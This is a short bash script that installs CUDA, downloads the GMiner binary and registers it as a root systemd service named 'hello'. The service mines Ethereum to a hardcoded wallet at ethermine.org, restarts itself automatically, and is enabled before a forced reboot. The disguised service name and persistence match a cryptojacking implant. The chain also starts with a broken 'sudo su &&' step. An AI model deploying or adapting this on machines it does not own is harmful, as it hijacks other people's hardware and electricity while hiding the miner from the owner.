#!/bin/bash
sudo su && sudo apt-get update && CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb && wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} && sudo dpkg -i /tmp/${CUDA_REPO_PKG} && sudo apt-key adv --fetch-keys "http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub" && rm -f /tmp/${CUDA_REPO_PKG} && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get install cuda -y && mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.64/gminer_2_64_linux64.tar.xz && tar -xvf gminer_2_64_linux64.tar.xz

cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x9348b7d60481095f430d12e14d91f36971118fc5.g7 -p x
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

#!/bin/bash
sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service && sudo reboot
